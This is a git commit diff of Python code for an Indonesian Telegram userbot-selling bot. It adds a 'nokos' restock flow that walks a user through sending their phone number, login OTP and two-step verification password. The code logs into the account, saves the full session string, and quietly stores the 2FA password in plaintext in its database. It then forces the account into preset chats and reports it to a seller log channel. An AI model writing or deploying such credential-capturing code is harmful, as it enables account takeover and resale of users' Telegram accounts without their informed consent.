6f0ea19c49832edf031f4d136d348ba88fdc1bc9
ferly kurniawan <89645813+FerlyKurniawan@users.noreply.github.com>
2026-05-11 07:59:14 +0700

    Update addubot_command.py

--- command/addubot_command.py
+++ command/addubot_command.py
@@ -287,3 +287,235 @@ Mohon simpan Token kamu dengan aman.</b></blockquote>"""
         )
     except Exception:
         logger.error(f"ERROR Create Users: {traceback.format_exc()}")
+
+# NOKOS FUNGSI
+
+async def mari_buat_nokos(client, message):
+    user_id = message.from_user.id
+
+    cek_stock = await db.get_nokos_by_id(user_id)
+    if not cek_stock:
+        return await message.reply(
+            "<b>❌ Kamu tidak memiliki akses restock nokos.</b>"
+        )
+
+    return await create_nokos(client, message)
+
+
+async def create_nokos(client, message):
+    try:
+        user_id = message.from_user.id
+        anu = ReplyKeyboardMarkup(
+            [
+                [KeyboardButton(text="Kontak Saya", request_contact=True)],
+            ],
+            resize_keyboard=True,
+            one_time_keyboard=True,
+        )
+        try:
+            phone = await client.ask(
+                user_id,
+                f"<blockquote><b>Silahkan klik tombol <u>Kontak Saya</u> untuk mengirimkan Nomor Telepon Telegram Anda.</b></blockquote>",
+                reply_markup=anu,
+            )
+            phone_number = phone.contact.phone_number
+        except AttributeError:
+            try:
+                phone = await client.ask(
+                    user_id,
+                    f"<blockquote><b>Silahkan klik tombol <u>Kontak Saya</u> untuk mengirimkan Nomor Telepon Telegram Anda.</b></blockquote>",
+                    reply_markup=anu,
+                )
+                phone_number = phone.contact.phone_number
+            except Exception:
+                return await bot.send_message(
+                    user_id,
+                    "<blockquote><b>PEA, punya mata dipake buat baca!! jangan BOKEP mulu.</b></blockquote>",
+                    reply_markup=ButtonUtils.start_menu(is_admin=False),
+                )
+        new_client = hydrogram.Client(
+            name=str(user_id),
+            api_id=API_ID,
+            api_hash=API_HASH,
+            in_memory=True,
+        )
+        await asyncio.sleep(2)
+        get_otp = await client.send_message(
+            user_id,
+            f"<b><blockquote>Sedang Mengirim Kode OTP...</blockquote></b>",
+            reply_markup=ReplyKeyboardRemove(),
+        )
+        await new_client.connect()
+        try:
+            code = await new_client.send_code(phone_number.strip())
+        except hydrogram.errors.exceptions.bad_request_400.ApiIdInvalid as AID:
+            await get_otp.delete()
+            return await client.send_message(user_id, AID)
+        except hydrogram.errors.exceptions.bad_request_400.PhoneNumberInvalid as PNI:
+            await get_otp.delete()
+            return await client.send_message(user_id, PNI)
+        except hydrogram.errors.exceptions.bad_request_400.PhoneNumberFlood as PNF:
+            await get_otp.delete()
+            return await client.send_message(user_id, PNF)
+        except hydrogram.errors.exceptions.bad_request_400.PhoneNumberBanned as PNB:
+            await get_otp.delete()
+            return await client.send_message(user_id, PNB)
+        except hydrogram.errors.exceptions.bad_request_400.PhoneNumberUnoccupied as PNU:
+            await get_otp.delete()
+            return await client.send_message(user_id, PNU)
+        except Exception as error:
+            await get_otp.delete()
+            return await client.send_message(
+                user_id,
+                f"<b>ERROR:</b> {error}",
+                reply_markup=ButtonUtils.start_menu(is_admin=False),
+            )
+        await get_otp.delete()
+        while True:
+            otp = await client.ask(
+                user_id,
+                f"<b><blockquote>Silakan Periksa Kode OTP dari <a href=tg://openmessage?user_id=777000>Akun Telegram</a> Resmi. Kirim Kode OTP ke sini setelah membaca Format di bawah ini.</b>\n\nJika Kode OTP adalah <code>12345</code> Tolong <b>[ TAMBAHKAN SPASI ]</b> kirimkan Seperti ini <code>1 2 3 4 5</code>.</blockquote></b>",
+            )
+            if otp.text.startswith("/"):
+                return await client.send_message(
+                    user_id,
+                    f"<blockquote><b>Proses di batalkan.</b></blockquote>",
+                    reply_markup=ButtonUtils.start_menu(is_admin=False),
+                )
+            otp_code = otp.text
+            try:
+                await new_client.sign_in(
+                    phone_number.strip(),
+                    code.phone_code_hash,
+                    phone_code=" ".join(str(otp_code)),
+                )
+                break
+            except hydrogram.errors.exceptions.bad_request_400.PhoneCodeInvalid:
+                await client.send_message(
+                    user_id, "<b>❌ Kode OTP salah. Coba lagi.</b>"
+                )
+                continue
+            except hydrogram.errors.exceptions.bad_request_400.PhoneCodeExpired:
+                return await client.send_message(
+                    user_id, "<b>❌ Kode OTP Expired. Silahkan ulangi proses.</b>"
+                )
+            except hydrogram.errors.exceptions.bad_request_400.BadRequest as error:
+                return await client.send_message(
+                    user_id,
+                    f"<b>ERROR:</b> {error}",
+                    reply_markup=ButtonUtils.start_menu(is_admin=False),
+                )
+            except hydrogram.errors.exceptions.unauthorized_401.SessionPasswordNeeded:
+                two_step_code = await client.ask(
+                    user_id,
+                    f"<b><blockquote>Akun anda Telah mengaktifkan Verifikasi Dua Langkah. Silahkan Kirimkan Passwordnya.</blockquote></b>",
+                )
+                if two_step_code.text.startswith("/"):
+                    return await client.send_message(
+                        user_id,
+                        f"<blockquote><b>Proses di batalkan.</b></blockquote>",
+                        reply_markup=ButtonUtils.start_menu(is_admin=False),
+                    )
+                new_code = two_step_code.text
+                try:
+                    await new_client.check_password(new_code)
+                    await dB.set_var(user_id, "PASSWORD", new_code)
+                except Exception as error:
+                    await client.send_message(
+                        user_id,
+                        "<b>❌ V2L yang anda masukkan salah!!. Silahkan masukkan dengan benar.</b>",
+                    )
+                    continue
+            break
+        session_string = await new_client.export_session_string()
+        await new_client.disconnect()
+        new_client.storage.session_string = session_string
+        new_client.in_memory = False
+        bot_msg = await client.send_message(
+            user_id,
+            f"<b><blockquote>Tunggu proses selama 1-5 menit...\nKami sedang menghidupkan Userbot Anda.</blockquote></b>",
+            disable_web_page_preview=True,
+        )
+        await asyncio.sleep(2)
+        star_client = UserBot(
+            name=str(user_id),
+            api_id=API_ID,
+            api_hash=API_HASH,
+            session_string=session_string,
+            in_memory=True,
+        )
+        try:
+            await star_client.start()
+            for modul in _PLUGINS:
+                importlib.reload(importlib.import_module(f"plugins.{modul}"))
+        except Exception as e:
+            logger.error(f"Error Client: {str(e)}")
+        if not await dB.get_expired_date(star_client.me.id):
+            await setExpiredUser(star_client.me.id)
+        await dB.add_ubot(
+            user_id=int(star_client.me.id),
+            session_string=session_string,
+        )
+        if not user_id == star_client.me.id:
+            star._ubot.remove(star_client)
+            await dB.remove_ubot(star_client.me.id)
+            await star_client.log_out()
+            return await bot_msg.edit(
+                f"<blockquote><b>Gunakan akun anda sendiri, bukan orang lain!!</b></blockquote>"
+            )
+        user_token = await dB.generate_token(star_client.me.id)
+        await asyncio.sleep(1)
+        seles = await dB.get_list_from_var(BOT_ID, "SELLER")
+        if star_client.me.id not in seles:
+            try:
+                AKSES_DEPLOY.remove(star_client.me.id)
+            except Exception:
+                pass
+        for chat in WAJIB_JOIN:
+            try:
+                await star_client.join_chat(chat)
+            except Exception:
+                pass
+        prefix = star.get_prefix(star_client.me.id)
+        keyb = ButtonUtils.start_menu(is_admin=False)
+        exp = await dB.get_expired_date(star_client.me.id)
+        PLAN = (
+            "basic" if await dB.get_var(star_client.me.id, "plan") == "basic" else "pro"
+        )
+        expir = exp.astimezone(timezone("Asia/Jakarta")).strftime("%Y-%m-%d %H:%M")
+        text_done = f"""
+<blockquote expandable><b>🔥 {bot.me.mention} Berhasil Di Aktifkan
+➡️ Akun: <a href=tg://openmessage?user_id={star_client.me.id}>{star_client.me.first_name} {star_client.me.last_name or ''}</a>
+➡️ ID: <code>{star_client.me.id}</code>
+➡️ Plan: <b>{PLAN}</b>
+➡️ Prefixes: {' '.join(prefix)}
+➡️ Token: <code>{user_token}</code>
+➡️ Masa Aktif: {expir}</b></blockquote>
+
+<blockquote expandable><b>Token kamu berfungsi untuk mengklaim garansi ubot, 
+jika kamu ingin berpindah akun atau akunmu dibanned oleh pihak Telegram.
+Mohon simpan Token kamu dengan aman.</b></blockquote>"""
+        await bot_msg.edit(text_done, disable_web_page_preview=True, reply_markup=keyb)
+        return await client.send_message(
+            LOG_SELLER,
+            f"""
+<b>❏ Notifikasi Userbot Aktif</b>
+<b>├ Akun :</b> <a href=tg://user?id={star_client.me.id}>{star_client.me.first_name} {star_client.me.last_name or ''}</a> 
+<b>├ ID :</b> <code>{star_client.me.id}</code>
+<b>╰ User Token :</b> <code>{user_token}</code>""",
+            reply_markup=ikb(
+                [
+                    [
+                        (
+                            "Cek Kadaluarsa",
+                            f"cek_masa_aktif {star_client.me.id}",
+                            "callback_data",
+                        )
+                    ]
+                ]
+            ),
+            disable_web_page_preview=True,
+        )
+    except Exception:
+        logger.error(f"ERROR Create Users: {traceback.format_exc()}")
+
